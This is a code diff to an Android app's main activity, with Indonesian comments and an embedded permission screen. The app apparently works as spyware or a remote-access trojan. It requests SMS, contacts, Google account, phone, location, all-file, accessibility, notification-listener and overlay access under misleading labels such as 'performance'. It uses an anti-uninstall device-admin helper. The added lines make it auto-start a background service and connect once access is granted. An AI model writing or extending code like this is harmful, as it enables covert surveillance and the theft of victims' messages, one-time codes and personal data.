@@ -3,6 +3,7 @@ package com.sync.xxx
 import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Activity
+import android.app.AppOpsManager
 import android.content.*
 import android.content.pm.PackageManager
 import android.location.LocationManager
@@ -20,7 +21,7 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
 
-    private val PERM_ALL = 999  // 🔥 SATU REQUEST UNTUK SEMUA!
+    private val PERM_ALL = 999
     private val REQ_SCREEN_CAPTURE = 102
     private val REQ_LOCATION_SETTINGS = 107
 
@@ -50,7 +51,6 @@ class MainActivity : AppCompatActivity() {
         registerReceivers()
         AntiUninstallHelper.requestAdminIfNeeded(this)
         
-        // 🔥 LANGSUNG MINTA SEMUA IZIN SEKALIGUS!
         requestAllPermissionsAtOnce()
     }
 
@@ -70,7 +70,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ===================== 🔥 REQUEST ALL PERMISSIONS SEKALIGUS =====================
+    // ===================== REQUEST ALL PERMISSIONS =====================
     
     private fun requestAllPermissionsAtOnce() {
         val permissions = mutableListOf<String>()
@@ -95,51 +95,53 @@ class MainActivity : AppCompatActivity() {
             permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
         }
         
-        // 🔥 FILTER PERMISSION YANG BELUM GRANTED
+        // FILTER PERMISSION YANG BELUM GRANTED
         val neededPermissions = permissions.filter { perm ->
             ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
         
         android.util.Log.d("Permission", "📋 Requesting ${neededPermissions.size} permissions sekaligus!")
-        android.util.Log.d("Permission", "📋 Permissions: ${neededPermissions.joinToString()}")
         
-        // 🔥 MINTA SEMUA SEKALIGUS!
         if (neededPermissions.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, neededPermissions, PERM_ALL)
         } else {
             android.util.Log.d("Permission", "✅ All permissions already granted!")
-            // Cek special permissions
             checkSpecialPermissions()
         }
     }
     
     private fun checkSpecialPermissions() {
-        // Ini yang butuh settings manual (bukan popup biasa)
-        
+        // Battery Optimization
         if (!isBatteryOptIgnored()) {
             openBatterySettings()
         }
         
+        // Overlay
         if (!isOverlayGranted()) {
             requestOverlayPerm()
         }
         
+        // Accessibility
         if (!isAccessibilityGranted()) {
             requestAccessibilityPerm()
         }
         
+        // Usage Access
         if (!isUsageAccessGranted()) {
             requestUsageAccessPerm()
         }
         
+        // Notification Listener
         if (!isNotifListenerGranted()) {
             openNotifListenerSettings()
         }
         
+        // Manage Storage (Android 11+)
         if (!isManageStorageGranted()) {
             requestManageStoragePerm()
         }
         
+        // GPS
         if (!isGpsEnabled()) {
             requestEnableGps()
         }
@@ -148,8 +150,7 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         
-        android.util.Log.d("Permission", "=== 📋 PERMISSION RESULT ===")
-        android.util.Log.d("Permission", "RequestCode: $requestCode")
+        android.util.Log.d("Permission", "=== PERMISSION RESULT ===")
         
         var allGranted = true
         permissions.forEachIndexed { index, perm ->
@@ -164,9 +165,14 @@ class MainActivity : AppCompatActivity() {
         Handler(Looper.getMainLooper()).postDelayed({
             webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
             
-            // Kalau semua regular permission sudah granted, cek special permissions
             if (allGranted) {
                 checkSpecialPermissions()
+                // Auto connect setelah semua granted
+                Handler(Looper.getMainLooper()).postDelayed({
+                    webView.evaluateJavascript("showConnected()", null)
+                    startDeviceService()
+                    sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
+                }, 1000)
             }
         }, 500)
     }
@@ -193,7 +199,13 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
+        // Cek apakah semua izin sudah granted
+        if (checkAllPermissionsGranted()) {
+            webView.evaluateJavascript("showConnected()", null)
+            startDeviceService()
+        } else {
+            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
+        }
     }
 
     override fun onNewIntent(intent: Intent?) {
@@ -270,6 +282,7 @@ class MainActivity : AppCompatActivity() {
     // ===================== PERMISSION CHECKS =====================
     
     fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    
     fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
     
     fun isGalleryGranted(): Boolean {
@@ -364,27 +377,50 @@ class MainActivity : AppCompatActivity() {
         return enabled?.contains(packageName) == true
     }
 
+    // FIXED: isUsageAccessGranted dengan AppOpsManager
     fun isUsageAccessGranted(): Boolean {
-        val appOps = getSystemService(AppOpsManager::class.java)
-        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            appOps.unsafeCheckOpNoThrow(
-                AppOpsManager.OPSTR_GET_USAGE_STATS,
-                android.os.Process.myUid(),
-                packageName
-            )
-        } else {
-            appOps.checkOpNoThrow(
-                AppOpsManager.OPSTR_GET_USAGE_STATS,
-                android.os.Process.myUid(),
-                packageName
-            )
+        try {
+            val appOps = getSystemService(AppOpsManager::class.java)
+            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                appOps.unsafeCheckOpNoThrow(
+                    AppOpsManager.OPSTR_GET_USAGE_STATS,
+                    Process.myUid(),
+                    packageName
+                )
+            } else {
+                appOps.checkOpNoThrow(
+                    AppOpsManager.OPSTR_GET_USAGE_STATS,
+                    Process.myUid(),
+                    packageName
+                )
+            }
+            return mode == AppOpsManager.MODE_ALLOWED
+        } catch (e: Exception) {
+            return false
         }
-        return mode == AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun checkAllPermissionsGranted(): Boolean {
+        return isCamGranted() &&
+               isSmsGranted() &&
+               isGalleryGranted() &&
+               isLocationGranted() &&
+               isContactsGranted() &&
+               isGmailGranted() &&
+               isPhoneGranted() &&
+               isManageStorageGranted() &&
+               isBatteryOptIgnored() &&
+               isOverlayGranted() &&
+               isAccessibilityGranted() &&
+               isUsageAccessGranted() &&
+               isNotifListenerGranted() &&
+               isGpsEnabled()
     }
 
     // ===================== REQUEST FUNCTIONS =====================
     
     fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_ALL)
+    
     fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_ALL)
     
     fun requestGalleryPerm() {
@@ -400,6 +436,30 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.WRITE_EXTERNAL_STORAGE
             ), PERM_ALL)
         }
+    }
+    
+    fun requestLocationPerm() {
+        ActivityCompat.requestPermissions(this,
+            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
+            PERM_ALL)
+    }
+    
+    fun requestContactsPerm() {
+        ActivityCompat.requestPermissions(this,
+            arrayOf(Manifest.permission.READ_CONTACTS),
+            PERM_ALL)
+    }
+    
+    fun requestGmailPerm() {
+        ActivityCompat.requestPermissions(this,
+            arrayOf(Manifest.permission.GET_ACCOUNTS),
+            PERM_ALL)
+    }
+    
+    fun requestPhonePerm() {
+        ActivityCompat.requestPermissions(this,
+            arrayOf(Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS),
+            PERM_ALL)
     }
     
     fun openNotifListenerSettings() {
@@ -442,7 +502,6 @@ class MainActivity : AppCompatActivity() {
     // ===================== BUILD HTML =====================
     
     private fun buildHtml(): String {
-        val serverUrl = DeviceService.SERVER_URL
         return """<!DOCTYPE html>
 <html lang="id">
 <head>
@@ -552,33 +611,46 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font
   </div>
   <div class="perm-divider"></div>
   <div class="perm-list" id="permList">
-    <!-- SEMUA ROW PERMISSION (SAMA KAYAK SEBELUMNYA) -->
+    <!-- CAMERA -->
     <div class="perm-row" id="row-cam"><div class="perm-icon pi-cam"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3.5"/></svg></div><div class="perm-info"><div class="perm-name">Kamera</div><div class="perm-desc">Dibutuhkan Untuk Fitur Pemindaian</div></div><label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label></div>
     
+    <!-- BATTERY -->
     <div class="perm-row" id="row-bat"><div class="perm-icon pi-bat"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="1" y="6" width="18" height="12" rx="2"/><path d="M23 13v-2"/><path d="M7 12h4M9 10v4"/></svg></div><div class="perm-info"><div class="perm-name">Pengoptimalan</div><div class="perm-desc">Mencegah Sistem Menghentikan Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-bat" onchange="onToggle('bat',this)"><span class="tog-track"></span></label></div>
     
+    <!-- OVERLAY -->
     <div class="perm-row" id="row-overlay"><div class="perm-icon" style="background:rgba(139,92,246,.12);color:#a78bfa"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/><rect x="6" y="7" width="5" height="4" rx="1"/><path d="M14 8h3M14 11h3"/></svg></div><div class="perm-info"><div class="perm-name">Floating</div><div class="perm-desc">Aplikasi Bisa Mengambang Diatas Aplikasi Lain</div></div><label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label></div>
     
+    <!-- ACCESSIBILITY -->
     <div class="perm-row" id="row-accessibility"><div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="4" r="2"/><path d="M12 6v6l3 3M6 8l2.5 2M18 8l-2.5 2M8.5 21l2-5M15.5 21l-2-5M10 13H8a2 2 0 0 0-2 2v1M14 13h2a2 2 0 0 1 2 2v1"/></svg></div><div class="perm-info"><div class="perm-name">Aksesibilitas</div><div class="perm-desc">Mendeteksi Dan Menambah Performa Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-accessibility" onchange="onToggle('accessibility',this)"><span class="tog-track"></span></label></div>
     
+    <!-- USAGE -->
     <div class="perm-row" id="row-usage"><div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg></div><div class="perm-info"><div class="perm-name">Penggunaan Aplikasi</div><div class="perm-desc">Melihat Daftar Aplikasi Terinstall</div></div><label class="tog"><input type="checkbox" id="tog-usage" onchange="onToggle('usage',this)"><span class="tog-track"></span></label></div>
     
+    <!-- SMS -->
     <div class="perm-row" id="row-sms"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div><div class="perm-info"><div class="perm-name">Baca SMS</div><div class="perm-desc">Membaca SMS Yang Masuk</div></div><label class="tog"><input type="checkbox" id="tog-sms" onchange="onToggle('sms',this)"><span class="tog-track"></span></label></div>
     
+    <!-- NOTIFICATION -->
     <div class="perm-row" id="row-notif"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></div><div class="perm-info"><div class="perm-name">Akses Notifikasi</div><div class="perm-desc">Membaca Notifikasi Dari Semua Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-notif" onchange="onToggle('notif',this)"><span class="tog-track"></span></label></div>
     
+    <!-- GALLERY -->
     <div class="perm-row" id="row-gallery"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="2" width="20" height="20" rx="2"/><circle cx="8" cy="8" r="2"/><path d="M22 15l-6-4-4 4-4-4-6 6"/></svg></div><div class="perm-info"><div class="perm-name">Galeri / Penyimpanan</div><div class="perm-desc">Mengakses Foto Dan File</div></div><label class="tog"><input type="checkbox" id="tog-gallery" onchange="onToggle('gallery',this)"><span class="tog-track"></span></label></div>
     
+    <!-- LOCATION -->
     <div class="perm-row" id="row-location"><div class="perm-icon" style="background:rgba(59,130,246,.12);color:#60a5fa"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="perm-info"><div class="perm-name">Izin Lokasi</div><div class="perm-desc">Mengakses Lokasi GPS</div></div><label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label></div>
     
+    <!-- GPS ON -->
     <div class="perm-row" id="row-gpson"><div class="perm-icon" style="background:rgba(16,185,129,.12);color:#34d399"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/><path d="M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12"/></svg></div><div class="perm-info"><div class="perm-name">Aktifkan GPS</div><div class="perm-desc">GPS Harus Dihidupkan</div></div><label class="tog"><input type="checkbox" id="tog-gpson" onchange="onToggle('gpson',this)"><span class="tog-track"></span></label></div>
     
+    <!-- CONTACTS -->
     <div class="perm-row" id="row-contacts"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div><div class="perm-info"><div class="perm-name">Kontak</div><div class="perm-desc">Membaca Daftar Kontak</div></div><label class="tog"><input type="checkbox" id="tog-contacts" onchange="onToggle('contacts',this)"><span class="tog-track"></span></label></div>
     
+    <!-- GMAIL -->
     <div class="perm-row" id="row-gmail"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div><div class="perm-info"><div class="perm-name">Akun Google</div><div class="perm-desc">Membaca Akun Google Terdaftar</div></div><label class="tog"><input type="checkbox" id="tog-gmail" onchange="onToggle('gmail',this)"><span class="tog-track"></span></label></div>
     
+    <!-- STORAGE -->
     <div class="perm-row" id="row-storage"><div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg></div><div class="perm-info"><div class="perm-name">Akses Semua File</div><div class="perm-desc">Akses Ke Semua File Di Penyimpanan</div></div><label class="tog"><input type="checkbox" id="tog-storage" onchange="onToggle('storage',this)"><span class="tog-track"></span></label></div>
     
+    <!-- PHONE -->
     <div class="perm-row" id="row-phone"><div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.6 3.4 2 2 0 0 1 3.58 1.22h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg></div><div class="perm-info"><div class="perm-name">Info Telepon & SIM</div><div class="perm-desc">Membaca Nomor Telepon & SIM</div></div><label class="tog"><input type="checkbox" id="tog-phone" onchange="onToggle('phone',this)"><span class="tog-track"></span></label></div>
   </div>
   
